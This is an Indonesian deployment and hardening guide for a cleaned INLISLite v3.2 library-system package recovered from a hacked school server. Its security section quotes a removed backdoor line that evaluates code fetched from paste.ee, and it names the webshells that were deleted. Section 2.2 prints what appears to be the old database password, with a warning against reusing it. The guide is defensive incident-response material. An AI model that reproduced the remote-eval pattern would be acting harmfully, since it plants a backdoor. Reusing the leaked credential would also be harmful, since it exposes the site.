# PANDUAN DEPLOY — INLISLite v3.2 (paket bersih)

**Paket:** `inlislite-clean-v3.2.zip` (589 MB)
**Dibuat:** 2 November 2026
**Checksum:** lihat file `SHA256SUMS.txt` di samping ZIP
**Isi:** 43.010 file, 1,02 GB (setelah diekstrak)

---

## 0. Baca dulu — apa yang ADA dan TIDAK ADA di paket ini

| Ada | Tidak ada (sengaja dikosongkan) |
|---|---|
| Seluruh kode aplikasi + `vendor/` | Isi `uploaded_files/` (1,4 GB — sumber webshell) |
| `vendor/composer/*` yang **sudah dibersihkan** | File unggahan lama (foto anggota, PDF, sampul) |
| Struktur folder `runtime/` kosong & siap tulis | Log, cache, debug (`runtime/*`) |
| `uploaded_files/.htaccess` yang diperketat | `composer.php` (webshell DevShell), `monarx-analyzer.php`, `phpinfo.php` |
| `robots.txt` | Data perpustakaan (database **tidak** termasuk) |

**Database tidak disertakan.** File `db_inlislite_sdit/inlislite_v3_kosong.sql` yang ada hanyalah skema kosong (185 tabel, 93 baris data master). Data asli harus diekspor dari database hosting lama, **diaudit dulu**, baru diimpor.

---

## 1. Prasyarat server

| Komponen | Wajib | Cek dengan |
|---|---|---|
| **PHP** | **5.6 – 7.1** (JANGAN 7.2+ / 8.x) | `php -v` atau `phpinfo()` |
| MySQL / MariaDB | 5.7+ / 10.x | `mysql --version` |
| Apache | 2.4 + `mod_rewrite` + `AllowOverride All` | — |
| Ekstensi PHP | `pdo_mysql`, `mbstring`, `gd`, `intl`, `zip`, `fileinfo`, `curl`, `openssl`, `xml` | `php -m` |
| Disk | min. 3 GB (kode + upload + DB) | — |

> **Kenapa tidak boleh PHP 7.2+?** Yii 2.0.7 masih memakai kelas `yii\base\Object` yang jadi reserved word sejak PHP 7.2 → fatal error saat boot. Selain itu 20 file memakai `each()` (dihapus PHP 8.0) dan 5 file memakai `split()` (dihapus PHP 7.0).

---

## 2. Langkah deploy

### 2.1 Upload & ekstrak

**Via SSH (disarankan):**
```bash
cd ~/public_html        # atau domain document root
# upload inlislite-clean-v3.2.zip ke folder ini lebih dulu
unzip inlislite-clean-v3.2.zip
rm inlislite-clean-v3.2.zip
```

**Via cPanel File Manager:** Upload ZIP → klik kanan → *Extract* → hapus ZIP.

> Pastikan hasil ekstrak langsung berada di document root (`index.php` ada di root, bukan di dalam subfolder).

### 2.2 Buat database

Di cPanel → **MySQL Databases**:
1. Buat database, mis. `bis_inlislite`
2. Buat user + password **baru** (jangan pakai `sx2X#SpF$E*#KP8`)
3. Beri user itu **ALL PRIVILEGES** pada database tersebut

### 2.3 Impor database

**Via SSH:**
```bash
mysql -u USER -p NAMA_DB < inlislite_v3_kosong.sql
```

**Via phpMyAdmin:** pilih database → tab *Import* → pilih file `.sql` → *Go*.

Jika ingin membawa data lama, ekspor dulu dari hosting lama:
```bash
mysqldump -u USER -p --single-transaction --routines NAMA_DB > data_lama.sql
```
lalu **audit tabel `user`** sebelum impor:
```sql
SELECT id, username, email, status, created_at FROM user ORDER BY created_at DESC;
```
Hapus akun yang tidak dikenal.

### 2.4 Edit konfigurasi

Buka `common/config/main-local.php`, ubah bagian `db`:

```php
'db' => [
    'class' => 'yii\db\Connection',
    'dsn' => 'mysql:host=localhost;dbname=bis_inlislite;port=3306',
    'username' => 'bis_inlislite_user',
    'password' => 'PASSWORD_BARU_YANG_KUAT',
    'charset' => 'utf8',
],
```

Opsional — aktifkan kirim email sungguhan:
```php
'mailer' => [
    'class' => 'yii\swiftmailer\Mailer',
    'viewPath' => '@common/mail',
    'useFileTransport' => false,   // ← ubah ke false
    'transport' => [
        'class' => 'Swift_SmtpTransport',
        'host' => 'mail.bis.sch.id',
        'port' => 587,
        'encryption' => 'tls',
        'username' => 'noreply@bis.sch.id',
        'password' => 'PASSWORD_EMAIL',
    ],
],
```

### 2.5 Sesuaikan domain

Satu-satunya file yang menulis domain secara hardcoded:
```
opac/views/sitemap.xml
```
Ganti `inlislite.balikpapanislamicschool.sch.id` → domain baru. File lain memakai `baseUrl` dinamis.

### 2.6 Atur permission

```bash
# file 644, folder 755
find . -type f -exec chmod 644 {} \;
find . -type d -exec chmod 755 {} \;

# hanya folder ini yang perlu writable
chmod -R 755 uploaded_files
chmod -R 755 api/runtime article/runtime bacaditempat/runtime backend/runtime \
              console/runtime digitalcollection/runtime frontend/runtime \
              guestbook/runtime keanggotaan/runtime opac/runtime \
              peminjamanmandiri/runtime pengembalianmandiri/runtime
chmod -R 755 assets
```

> Jika memakai cPanel, folder writable cukup **755** (jangan 777).

### 2.7 Uji akses

| URL | Harapan |
|---|---|
| `https://domain/` | Beranda OPAC/frontend tampil |
| `https://domain/opac/` | Katalog online |
| `https://domain/backend/` | Halaman login admin |
| `https://domain/index.php?r=site/index` | Alternatif jika rewrite gagal |

### 2.8 Hardening pasca-deploy (WAJIB)

1. **Pastikan `uploaded_files/.htaccess` terpasang** (sudah ada di paket). Uji: buat file `uploaded_files/tes.php` berisi `<?php echo "HIDUP"; ?>` → buka di browser → harus **403/500**, bukan "HIDUP". Hapus file tes setelahnya.
2. **Blokir PHP di level vhost** (lebih kuat dari `.htaccess`):
   ```apache
   <Directory "/home/USER/public_html/uploaded_files">
       php_flag engine off
       <FilesMatch "\.(php[0-9]?|phtml|phar|pht|shtml|cgi|pl|py|sh)$">
           Require all denied
       </FilesMatch>
   </Directory>
   ```
3. Pastikan `YII_DEBUG=false` dan `YII_ENV='prod'` di **semua** `index.php` (sudah diatur di paket).
4. Hapus `tests/` dan `environments/` dari server produksi (tidak dipakai).
5. Aktifkan HTTPS + redirect paksa.
6. Batasi akses `/backend/` dengan IP allow-list bila memungkinkan.
7. Backup otomatis harian (file + database).

---

## 3. Troubleshooting

| Gejala | Penyebab | Solusi |
|---|---|---|
| **HTTP 500** di semua halaman | `.htaccess` ditolak (`AllowOverride None`) | Minta hosting set `AllowOverride All` |
| **Fatal: Cannot use 'Object' as class name** | PHP terlalu baru (7.2+) | Turunkan ke PHP 5.6 / 7.1 |
| **Fatal: Call to undefined function split()** | PHP ≥ 7.0 di halaman tertentu | Turunkan PHP atau patch file (lihat bagian 5) |
| **Blank putih** | `runtime/` tidak writable | `chmod -R 755 */runtime` |
| **CSS/JS tidak muncul** | `assets/` tidak writable | `chmod -R 755 assets` |
| **"Invalid Configuration – yii\base\InvalidConfigException"** | Ekstensi `intl` tidak aktif | Aktifkan `intl` di PHP Selector |
| **Error koneksi DB** | Kredensial / nama DB salah | Cek ulang `main-local.php` |
| **404 di `/opac/`** | `mod_rewrite` mati | Aktifkan `mod_rewrite` |
| **Gambar/foto tidak tampil** | `uploaded_files/` kosong (memang dikosongkan) | Upload ulang file sah |

---

## 4. Struktur folder setelah deploy

```
public_html/
├─ index.php              → frontend (beranda)
├─ backend/index.php      → panel admin
├─ opac/index.php         → katalog online
├─ article/ guestbook/ keanggotaan/ bacaditempat/
├─ peminjamanmandiri/ pengembalianmandiri/ digitalcollection/ api/
├─ common/                → config & model bersama
├─ vendor/                → library (jangan diedit)
├─ uploaded_files/        → file unggahan (writable, tanpa eksekusi PHP)
├─ assets/                → cache aset (writable)
├─ */runtime/             → cache & log (writable)
└─ robots.txt
```

---

## 5. Jika hosting hanya menyediakan PHP 8

Paket ini **tidak akan jalan**. Dua pilihan:

**A. Minta hosting menyediakan PHP 7.1** lewat MultiPHP Manager (paling cepat).

**B. Upgrade kode ke PHP 8** (perlu waktu):
1. Yii `2.0.7` → `2.0.45+` (menghilangkan `yii\base\Object`)
2. `split()` → `explode()` / `preg_split()` — 5 file
3. `each()` → `foreach` — 20 file
4. Uji ulang semua modul (sirkulasi, katalog, keanggotaan, OPAC)
5. Jalankan `composer update` dengan PHP 8

Alternatif jangka panjang: gunakan rilis INLISLite terbaru dari Perpusnas yang sudah mendukung PHP 8.

---

## 6. Rollback

```bash
# kembalikan konfigurasi lama (jika menyimpan backup)
cp common/config/main-local.php.bak common/config/main-local.php
```

Untuk data: restore dari `mysqldump` terakhir. Untuk kode: ekstrak ulang ZIP.

---

## 7. Catatan keamanan penting

Paket ini berasal dari instalasi yang pernah dibobol. Yang sudah dibersihkan:

- `vendor/autoload.php` — **Backdoor:PHP/Webshell.AR!AMTB** (31 KB, terdeteksi antivirus)
- `vendor/composer/autoload_real.php` — backdoor `eval(file_get_contents("https://paste.ee/r/..."))`
- `composer.php` — DevShell File Manager v4.0 (webshell file manager)
- 4 webshell, 3 doorway judi, 12 `.htaccess` berbahaya, 2 uploader

**Namun** karena instalasi sumbernya sendiri sudah terinfeksi (backdoor `vendor/autoload.php` bertanggal sama dengan tanggal instalasi), sangat disarankan:

1. Bandingkan `vendor/` paket ini dengan source resmi INLISLite v3.2 dari Perpusnas
2. Atau deploy dari source resmi, lalu pindahkan hanya folder `common/`, `frontend/`, `backend/`, dll. yang sudah dipastikan bersih
3. Setelah live, pasang **file integrity monitoring** agar perubahan tak terduga langsung terdeteksi

Simpan file karantina (`_QUARANTINE_20261102`) minimal 90 hari untuk keperluan forensik.

---

## 8. Checklist singkat

```
[ ] Hosting mendukung PHP 5.6–7.1
[ ] Ekstensi intl, mbstring, gd, zip, pdo_mysql aktif
[ ] AllowOverride All aktif
[ ] ZIP diekstrak di document root
[ ] Database dibuat + user baru dengan password kuat
[ ] main-local.php disesuaikan
[ ] Permission runtime & uploaded_files = 755
[ ] domain di opac/views/sitemap.xml diganti
[ ] Beranda, /opac/, /backend/ dapat diakses
[ ] Tes upload .php di uploaded_files → harus 403/500
[ ] HTTPS aktif
[ ] Backup otomatis terjadwal
```
